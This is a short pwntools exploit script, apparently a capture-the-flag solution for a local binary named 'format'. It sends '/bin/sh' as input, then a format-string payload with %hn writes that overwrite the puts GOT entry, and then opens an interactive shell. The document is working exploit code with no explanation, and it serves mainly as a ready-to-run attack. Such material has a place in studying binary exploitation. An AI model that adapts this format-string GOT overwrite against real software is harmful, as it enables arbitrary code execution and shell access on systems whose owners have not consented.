from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
context.arch = 'amd64'

elf = ELF("./format")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_got = elf.got['puts']

sh = process("./format")

sh.recvuntil("name:")
sh.send(b"/bin/sh\x00")

sh.recvuntil("message:")
payload = b'%64c%9$hn'+b'%1488c%10$hnaaa'+p64(puts_got+2)+p64(puts_got)
sh.sendline(payload)
sh.interactive()

